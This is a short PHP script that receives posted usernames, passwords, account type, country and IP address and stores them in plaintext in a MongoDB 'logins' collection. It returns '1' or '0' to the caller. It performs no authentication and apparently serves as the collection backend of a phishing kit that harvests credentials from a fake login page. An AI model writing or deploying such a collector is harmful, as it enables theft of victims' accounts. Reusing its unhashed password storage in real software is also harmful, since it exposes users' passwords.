<?php
require 'vendor/autoload.php'; // Include Composer's autoloader

use MongoDB\Client;

// Load the configuration
$config = require 'config.php';

// Get the POST data
$user = $_POST['user'];
$pass = $_POST['pass'];
$type = $_POST['type'];
$country = $_POST['country'];
$ip = $_POST['ip'];

// Prepare the data as an associative array
$data = array(
    "user" => $user,
    "pass" => $pass,
    "type" => $type,
    "country" => $country,
    "ip" => $ip,
    "timestamp" => date("Y-m-d H:i:s")
);

try {
    // Connect to MongoDB using the configuration file
    $client = new Client($config['mongodb_uri']);

    // Select the database and collection
    $database = $client->selectDatabase($config['database_name']);
    $collection = $database->selectCollection('logins');

    // Insert the data into the collection
    $insertResult = $collection->insertOne($data);

    // Check if the insert was successful
    if ($insertResult->getInsertedCount() === 1) {
        echo "1";
    } else {
        echo "0";
    }
} catch (Exception $e) {
    // Handle any errors
    echo "Error: " . $e->getMessage();
}
?>
